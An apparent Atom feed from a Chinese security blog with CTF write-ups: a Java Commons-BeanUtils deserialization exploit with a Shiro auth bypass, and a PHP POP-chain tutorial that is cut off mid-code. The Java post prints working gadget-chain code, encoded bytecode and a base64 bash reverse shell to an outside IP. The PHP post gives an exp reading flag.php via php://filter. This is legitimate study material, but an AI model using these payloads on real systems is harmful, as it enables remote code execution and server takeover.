<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Arsene.Tang</title>
  
  <subtitle>一个喜欢web安全但菜的离谱的萌新</subtitle>
  <link href="https://arsenetang.github.io/atom.xml" rel="self"/>
  
  <link href="https://arsenetang.github.io/"/>
  <updated>2023-03-22T09:07:03.128Z</updated>
  <id>https://arsenetang.github.io/</id>
  
  <author>
    <name>Arsene.Tang</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>WP篇之2022美团CTF --- easyjava</title>
    <link href="https://arsenetang.github.io/2022/09/17/WP%E7%AF%87%E4%B9%8B2022%E7%BE%8E%E5%9B%A2CTF---easyjava/"/>
    <id>https://arsenetang.github.io/2022/09/17/WP%E7%AF%87%E4%B9%8B2022%E7%BE%8E%E5%9B%A2CTF---easyjava/</id>
    <published>2022-09-16T16:00:00.000Z</published>
    <updated>2023-03-22T09:07:03.128Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2022美团CTF-—-easyjava"><a href="#2022美团CTF-—-easyjava" class="headerlink" title="2022美团CTF — easyjava"></a>2022美团CTF — easyjava</h1><p>好久没写博客了，今天看了看美团CTF的题，打出了一道java反序列化，应该算是我在比赛中打出的第一道java反序列化的题吧，挺有纪念意义的哈哈，之前都是复现或者打一些简单的java题，像什么log4j，fastjson啥的，都不算是反序列化吧，那么就来写写这道题的wp</p><span id="more"></span><p>首先拿到jar包，放<code>jd-gui</code>里面打开，一眼就看到反序列化的点了：</p><p><img src="https://s1.ax1x.com/2023/03/22/ppdnhwV.png" alt="1.png"></p><p>但是很显然，这里是直接访问不到这个路由的，因为这里做了过滤：</p><p><img src="https://s1.ax1x.com/2023/03/22/ppdngQs.png" alt="2.png"></p><p>这里我看了看shiro的版本是1.5.2，是存在权限绕过漏洞的，随便去网上找篇文章就行，只不过我这儿犯蠢了，试了一大堆不常见的方法，结果最常见的一种没试，导致浪费了很多时间，要不然说不定可以一血呜呜，文章在这儿：<a href="https://xz.aliyun.com/t/7964">https://xz.aliyun.com/t/7964</a>；就是直接在前面加上分号<code>;</code>就行：</p><p><img src="https://s1.ax1x.com/2023/03/22/ppdnfe0.png" alt="3.png"></p><p>接下来就来看反序列化了，先看看有哪些依赖：</p><p><img src="https://s1.ax1x.com/2023/03/22/ppdn6zj.png" alt="4.png"></p><p>一眼就看到了cc和cb，只不过cc版本有点儿新，应该是<code>commons-collections-3</code>里面最新的一个版本了，我本地测了测用cc打不通，可能能有绕过啥的，但比赛时间有限，这儿就没详细琢磨了，直接用cb链打了，先看看题目做出的过滤：</p><p><img src="https://s1.ax1x.com/2023/03/22/ppdn6zj.png" alt="5.png"></p><p>其实这过滤真挺离谱的，估摸着是出题人写错了，<code>com.sun.org.apache.xalan.internal.xsltc.traxTemplatesImpl</code>中间搞忘加.了吧哈哈哈，这种过滤写法就相当于没过滤了，直接用cb链加载字节码就好了，关于cb链的介绍移步我的另外一篇文章：<a href="http://arsenetang.com/2022/03/09/Java%E7%AF%87%E4%B9%8BCommons%20Beanutils/">http://arsenetang.com/2022/03/09/Java%E7%AF%87%E4%B9%8BCommons%20Beanutils/</a>，这里就不过多解释了</p><p>payload如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">payload</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(Object o)<span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unserialize</span><span class="params">(<span class="keyword">byte</span>[] barr)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        BeanComparator comparator = <span class="keyword">new</span> BeanComparator();</span><br><span class="line">        Queue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;obj, <span class="number">1</span>&#125;);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize(queue)));</span><br><span class="line">        <span class="comment">//unserialize(serialize(queue));</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里需要注意的是，由于题目的<code>commons-beanutils</code>版本是1.9.4，所以说我们本地的cb也需要调到这个版本哈，不然反序列化会报错</p><p>我们先用本地来试试，别忘了这个payload生成出来之后得先url编码一遍哈</p><p><img src="https://s1.ax1x.com/2023/03/22/ppdn4oT.png" alt="6.png"></p><p>本地打通了，说明链子没问题了，接下来就很好办了，把字节码换成远程反弹shell的字节码就好了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evil</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuNjYuNjcvMTIzMzMgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个是将字节码base64编码的脚本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">base64</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        InputStream ios = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;E:\\ysoserial-master\\target\\classes\\ysoserial\\test\\evil.class&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> temp = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>((temp = ios.read()) != -<span class="number">1</span>)&#123;</span><br><span class="line">            baos.write(temp);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们将生成的class文件base64编码之后，放入payload中，替换掉那一段字节码就好了，然后就可以直接打咯：</p><p><img src="https://s1.ax1x.com/2023/03/22/ppdn2yn.jpg" alt="7.png"></p><p>收到反弹的shell，直接拿到flag</p><p>其实做完之后，发现这道题也不难，就是一个shiro的权限绕过，再加上cb链的基础运用，挺常规的一题，只不过java题嘛，要注意的细节都挺多的，比如说各种依赖的版本，jdk的版本啥的，有的细节忽略了都会导致题打不出来</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2022美团CTF-—-easyjava&quot;&gt;&lt;a href=&quot;#2022美团CTF-—-easyjava&quot; class=&quot;headerlink&quot; title=&quot;2022美团CTF — easyjava&quot;&gt;&lt;/a&gt;2022美团CTF — easyjava&lt;/h1&gt;&lt;p&gt;好久没写博客了，今天看了看美团CTF的题，打出了一道java反序列化，应该算是我在比赛中打出的第一道java反序列化的题吧，挺有纪念意义的哈哈，之前都是复现或者打一些简单的java题，像什么log4j，fastjson啥的，都不算是反序列化吧，那么就来写写这道题的wp&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="wp" scheme="https://arsenetang.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>反序列化篇之聊聊非线性pop链</title>
    <link href="https://arsenetang.github.io/2022/08/03/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8B%E8%81%8A%E8%81%8A%E9%9D%9E%E7%BA%BF%E6%80%A7pop%E9%93%BE/"/>
    <id>https://arsenetang.github.io/2022/08/03/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8B%E8%81%8A%E8%81%8A%E9%9D%9E%E7%BA%BF%E6%80%A7pop%E9%93%BE/</id>
    <published>2022-08-02T16:00:00.000Z</published>
    <updated>2023-03-22T08:58:51.945Z</updated>
    
    <content type="html"><![CDATA[<h1 id="聊聊非线性pop链"><a href="#聊聊非线性pop链" class="headerlink" title="聊聊非线性pop链"></a>聊聊非线性pop链</h1><p>前两天打强网杯，发现里面一道题还挺有意思，是一道<code>session.upload_progress</code>上传文件，然后构造pop链触发phar反序列化，最后用ssrf发请求的一道题，其它过程感觉都很平常，但这个pop链还挺有意思的，上网一搜索发现在<code>NSSCTF Round#3</code>中出过类似的链子，那么接下来就来聊聊这种非线性的pop链</p><span id="more"></span><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><p>我们之前学的PHP的pop链，都是一条链子从头拉到尾，从反序列化的地方到最终获取flag的地方，用一条链子连起来，思路很清晰，但在很多情况下这种链子有它的局限性，比如说出现<code>__wakeup()</code>了，看看下面这段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$date</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file-&gt;<span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;date;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flagpath</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;str-&gt;flagpath;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;getflag();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment"># flag is in flag.php</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;flagpath);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;flagpath = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = unserialize(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>其实这个感觉也不能算非线性链子，还是一条链子拉下来的，只不过里面的思路我们可以参考，这题之所以看起来不太一样就是因为有<code>__wakeup()</code>的存在，导致我们不能像以前一样很轻松的控制<code>$this-&gt;flagpath</code>的值；很多小伙伴可能会说，不是说可以用<code>CVE-2016-7124</code>来绕过吗，修改属性数不等于实际的属性数即可，只不过这种方法是有版本限制的哈，影响版本为<code>php5.0.0 ~ php5.6.25</code>以及<code>php7.0.0 ~ php7.0.10</code>，在这个版本内肯定可行，高版本的PHP<strong>不一定</strong>就不行，但是绝大多数都不行，这种比较碰运气，偶然性很强，得看具体版本，后面看别的师傅的wp才发现强网杯遇到的那个题就可以直接通过改属性个数来绕过，当初还卡了我半天，很气</p><p>接着看回这个题，既然我们没办法直接给<code>$this-&gt;flagpath</code>赋值，那我们就想想有没有啥间接的方法，因为众所周知<code>__wakeup()</code>是在反序列化后一开始就触发的，而<code>__destruct()</code>是在对象被销毁时才触发，所以说只要我们想办法在<code>__wakeup()</code>后再给<code>$this-&gt;flagpath</code>赋值就行了；看向上面的<code>Test</code>类，里面有个<code>__get($value)</code>，正好就有赋值操作，并且<code>$this-&gt;date</code>我们可控，<code> $this-&gt;file</code>我们也可控，可以把它赋值成一个<code>Flag</code>对象，那么也就是说只要<code>$value</code>是我们想要的<code>flagpath</code>即可，<code>$value</code>是作为<code>__get()</code>的参数传入的；当调用类中不存在的属性时，就会调用<code>__get()</code>，而调用时的属性名，就会作为参数传入，看个例子一看便懂</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        var_dump(<span class="variable">$value</span>)</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$a</span> -&gt; flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>[<img src="https://s1.ax1x.com/2023/03/22/ppdm2VK.png" alt="ppdm2VK.png">](<a href="https://img/">https://img</a></p><p>所以说只要我们能找到地方调用<code>flagpath</code>就行，正好在<code>Flag</code>类中的<code>__toString()</code>方法里就有，我们让<code>$this-&gt;str</code>赋值为一个<code>Test</code>对象即可，整条链子就通了，完整exp如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$date</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flagpath</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Flag();</span><br><span class="line"><span class="variable">$a1</span> = <span class="keyword">new</span> Flag();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$a</span> -&gt; str =<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; date = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; file = <span class="variable">$a1</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; tmp = <span class="variable">$a1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>前面基本上都讲完了，再简单分析下吧，链子的开头是在<code>__destruct</code>中，然后以字符串的形式输出对象进而触发<code>__toString()</code>，在这里本来就可以直接调<code>getflag()</code>了，可惜<code>$this-&gt;flagpath</code>我们没控制住，所以说得把<code>$this-&gt;str</code>赋值为一个<code>Test</code>对象，调用到<code>Test</code>对象的<code>__get()</code>方法中，在这里实现赋值，再调进<code>__toString()</code>和<code>getflag()</code>即可</p><p><img src="https://s2.loli.net/2022/08/03/Gy8un3EhkVzBNpa.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/08/03/rDbSaMTFoPjfgu7.png" alt="image.png"></p><p>有了这个基础，理解强网杯那道题的非线性链就没有任何障碍啦</p><h2 id="第6届强网杯-easyweb-pop链解析"><a href="#第6届强网杯-easyweb-pop链解析" class="headerlink" title="第6届强网杯 easyweb pop链解析"></a>第6届强网杯 easyweb pop链解析</h2><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = unserialize(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Upload</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filesize</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$date</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;1.get&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span 